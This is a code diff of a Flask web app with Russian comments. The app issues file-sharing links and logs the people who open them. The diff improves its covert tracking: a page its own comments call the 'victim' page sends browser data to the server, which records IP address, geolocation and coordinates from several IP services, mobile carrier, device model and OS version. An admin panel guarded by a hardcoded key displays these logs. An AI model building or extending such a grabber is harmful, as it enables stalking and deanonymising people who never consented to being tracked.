@@ -1,13 +1,12 @@
 from flask import Flask, request, send_from_directory, jsonify, render_template_string, redirect
 import sqlite3, uuid, os, time, requests, json, mimetypes, re
-from user_agents import parse
+from device_detector import DeviceDetector  # <-- НОВАЯ БИБЛИОТЕКА
 
 app = Flask(__name__)
 UPLOAD_FOLDER = 'static/uploads'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 DB = 'db.sqlite'
 
-# ========== СЕКРЕТНЫЙ КЛЮЧ (измените при необходимости) ==========
 ADMIN_SECRET = "18iwixjwi199woxk"
 
 def init_db():
@@ -69,9 +68,8 @@ STYLES = """
 </style>
 """
 
-# ========== ФУНКЦИЯ ГЕОЛОКАЦИИ (3 ИСТОЧНИКА) ==========
+# ========== ГЕОЛОКАЦИЯ (3 источника) ==========
 def get_geo_info(ip):
-    """Определение города из трёх источников: ip-api.com, ipapi.co, geojs.io"""
     result = {
         'city_ipapi': '',
         'city_ipapico': '',
@@ -82,7 +80,6 @@ def get_geo_info(ip):
         'timezone': '',
         'source': 'multiple'
     }
-    # 1. ip-api.com
     try:
         resp = requests.get(f'http://ip-api.com/json/{ip}?fields=city,country,regionName,timezone', timeout=3)
         if resp.status_code == 200:
@@ -93,8 +90,6 @@ def get_geo_info(ip):
                 result['timezone'] = data.get('timezone', '')
     except:
         pass
-
-    # 2. ipapi.co
     try:
         resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
         if resp.status_code == 200:
@@ -111,8 +106,6 @@ def get_geo_info(ip):
                     result['country'] = data['country_name']
     except:
         pass
-
-    # 3. geojs.io
     try:
         resp = requests.get(f'https://get.geojs.io/v1/ip/geo/{ip}.json', timeout=3)
         if resp.status_code == 200:
@@ -121,51 +114,20 @@ def get_geo_info(ip):
                 result['city_geojs'] = data.get('city', '')
     except:
         pass
-
+    if not result['loc']:
+        try:
+            resp = requests.get(f'https://ipinfo.io/{ip}/json', timeout=3)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get('loc'):
+                    result['loc'] = data['loc']
+                if data.get('org'):
+                    result['org'] = data['org']
+                if not result['country'] and data.get('country'):
+                    result['country'] = data['country']
+        except:
+            pass
     return result
-
-# ========== БАЗА DPI ДЛЯ ОПРЕДЕЛЕНИЯ МОДЕЛИ ==========
-DEVICE_DB = {
-    (1170, 2532, 3.0): ('Apple', 'iPhone 14 Pro / 15 Pro'),
-    (1179, 2556, 3.0): ('Apple', 'iPhone 15 Pro Max'),
-    (1125, 2436, 3.0): ('Apple', 'iPhone X / XS / 11 Pro'),
-    (1242, 2688, 3.0): ('Apple', 'iPhone XS Max / 11 Pro Max'),
-    (828, 1792, 2.0): ('Apple', 'iPhone XR / 11'),
-    (750, 1334, 2.0): ('Apple', 'iPhone 6/7/8 / SE2/SE3'),
-    (1080, 1920, 2.0): ('Apple', 'iPhone 6 Plus / 7 Plus / 8 Plus'),
-    (1080, 2340, 3.0): ('Samsung', 'Galaxy S21/S22/S23 (базовый)'),
-    (1440, 3040, 3.0): ('Samsung', 'Galaxy S21+/S22+/S23+'),
-    (1440, 3088, 3.0): ('Samsung', 'Galaxy S21 Ultra / S22 Ultra / S23 Ultra'),
-    (1080, 2400, 3.0): ('Samsung', 'Galaxy A52/A53/A54'),
-    (720, 1600, 2.0): ('Samsung', 'Galaxy A12/A13'),
-    (1080, 2400, 2.75): ('Google', 'Pixel 7 / 8'),
-    (1440, 3120, 3.0): ('Google', 'Pixel 7 Pro / 8 Pro'),
-    (1080, 2340, 2.5): ('Google', 'Pixel 6'),
-    (1440, 3120, 2.5): ('Google', 'Pixel 6 Pro'),
-    (1080, 2400, 3.0): ('Xiaomi', 'Redmi Note 10/11/12'),
-    (1080, 2340, 3.0): ('Xiaomi', 'Xiaomi 11/12'),
-    (1440, 3200, 3.0): ('Xiaomi', 'Xiaomi 12 Pro / 13 Pro'),
-    (720, 1600, 2.0): ('Xiaomi', 'Redmi 9/10'),
-    (1080, 2400, 3.0): ('OnePlus', 'OnePlus 9/10/11'),
-    (1440, 3216, 3.0): ('OnePlus', 'OnePlus 10 Pro/11 Pro'),
-    (1080, 2400, 3.0): ('Huawei', 'P30/P40'),
-    (1440, 3120, 3.0): ('Huawei', 'Mate 40 Pro'),
-}
-
-def guess_device_by_screen(screen_str, dpr):
-    try:
-        parts = screen_str.split('x')
-        if len(parts) >= 2:
-            w = int(parts[0])
-            h = int(parts[1])
-            if w < h:
-                w, h = h, w
-            for (bw, bh, bdpr), (brand, model) in DEVICE_DB.items():
-                if abs(w - bw) <= 5 and abs(h - bh) <= 5 and abs(dpr - bdpr) <= 0.1:
-                    return brand, model
-    except:
-        pass
-    return None, None
 
 # ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 def get_real_ip():
@@ -310,7 +272,7 @@ def upload(secret):
     </html>
     ''', link=link, uid=uid, original_name=original_name, mime_type=mime_type, secret=secret, STYLES=STYLES)
 
-# ========== СТРАНИЦА ДЛЯ ЖЕРТВЫ (без секрета) ==========
+# ========== СТРАНИЦА ДЛЯ ЖЕРТВЫ ==========
 TRACK_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -482,7 +444,7 @@ def track(uid):
                                   uid=uid, filename=filename, original_name=original_name, mime_type=mime_type,
                                   title=title, custom_text=text, bg_color=bg)
 
-# ========== СБОР ДАННЫХ ==========
+# ========== СБОР ДАННЫХ (с DeviceDetector) ==========
 @app.route('/collect', methods=['POST'])
 def collect():
     data = request.get_json()
@@ -492,28 +454,18 @@ def collect():
     ip = get_real_ip()
     ua = request.headers.get('User-Agent', '')
     
-    # Геолокация из трёх источников
+    # Геолокация
     geo = get_geo_info(ip)
     
-    # Парсинг User-Agent
-    parsed_ua = parse(ua)
-    os_version = parsed_ua.os.version_string
-    device_model_ua = parsed_ua.device.family
-    device_brand_ua = parsed_ua.device.brand
+    # Определение устройства через DeviceDetector
+    dd = DeviceDetector(ua).parse()
+    device_brand = dd.brand() or 'Неизвестно'
+    device_model = dd.model() or 'Неизвестно'
+    os_name = dd.os_name() or 'Неизвестно'
+    os_version = dd.os_version() or 'Неизвестно'
     
-    # Определение модели по DPI
-    screen_str = data.get('screen', '')
-    dpr = data.get('dpr', 1)
-    brand_dpi, model_dpi = guess_device_by_screen(screen_str, dpr)
-    
-    if model_dpi:
-        device_model = model_dpi
-        device_brand = brand_dpi if brand_dpi else device_brand_ua
-    else:
-        device_model = device_model_ua
-        device_brand = device_brand_ua
-    
-    if not device_model or device_model == 'Other':
+    # Если модель не определена, пробуем извлечь вручную (запасной вариант)
+    if device_model == 'Неизвестно' or 'Other' in device_model:
         if 'iPhone' in ua:
             match = re.search(r'iPhone(\d+,\d+)', ua)
             if match:
@@ -524,22 +476,28 @@ def collect():
             match = re.search(r'; (SM-[A-Za-z0-9]+)', ua)
             if match:
                 device_model = match.group(1)
-            else:
-                device_model = 'Android-устройство'
     
-    if not device_brand:
-        device_brand = 'Неизвестно'
+    # Если бренд не определён, но модель есть, пытаемся угадать из модели
+    if device_brand == 'Неизвестно' and device_model != 'Неизвестно':
+        # Простая эвристика по первым буквам
+        if device_model.startswith('SM-'):
+            device_brand = 'Samsung'
+        elif device_model.startswith('iPhone'):
+            device_brand = 'Apple'
+        elif device_model.startswith('Pixel'):
+            device_brand = 'Google'
+        # и т.д. — можно расширить
+
+    operator = geo.get('org', '')
     
     # Добавляем данные в fingerprint
     data['os_version'] = os_version
     data['device_model'] = device_model
     data['device_brand'] = device_brand
-    data['operator'] = geo.get('org', '')
+    data['operator'] = operator
     data['geo'] = geo
     
-    # Сохраняем город как первый из доступных (для поля city в таблице)
     city = geo.get('city_ipapi') or geo.get('city_ipapico') or geo.get('city_geojs') or ''
-    
     fingerprint = json.dumps(data)
     conn = sqlite3.connect(DB)
     conn.execute("INSERT INTO logs (uid, ip, ua, city, fingerprint, time) VALUES (?,?,?,?,?,?)",
@@ -626,14 +584,12 @@ def admin_logs_detail(secret, num):
                 try:
                     fp_data = json.loads(fp)
                     geo = fp_data.get('geo', {})
-                    # Вывод трёх городов
                     city1 = geo.get('city_ipapi', '') or 'Неизвестно'
                     city2 = geo.get('city_ipapico', '') or 'Неизвестно'
                     city3 = geo.get('city_geojs', '') or 'Неизвестно'
                     html += f"<b>Город (ip-api.com):</b> {city1}<br>"
                     html += f"<b>Город (ipapi.co):</b> {city2}<br>"
                     html += f"<b>Город (geojs.io):</b> {city3}<br>"
-                    # Координаты и оператор
                     loc = geo.get('loc')
                     org = geo.get('org')
                     if loc or org:
@@ -646,7 +602,6 @@ def admin_logs_detail(secret, num):
                         html += "</div>"
                     else:
                         html += "<div class='geo-info'><b>🌍 Дополнительная геолокация:</b> недоступна<br></div>"
-                    # Остальные данные
                     html += f"<b>Версия ОС:</b> {fp_data.get('os_version', 'неизвестно')}<br>"
                     html += f"<b>Модель устройства:</b> {fp_data.get('device_model', 'неизвестно')}<br>"
                     html += f"<b>Бренд:</b> {fp_data.get('device_brand', 'неизвестно')}<br>"
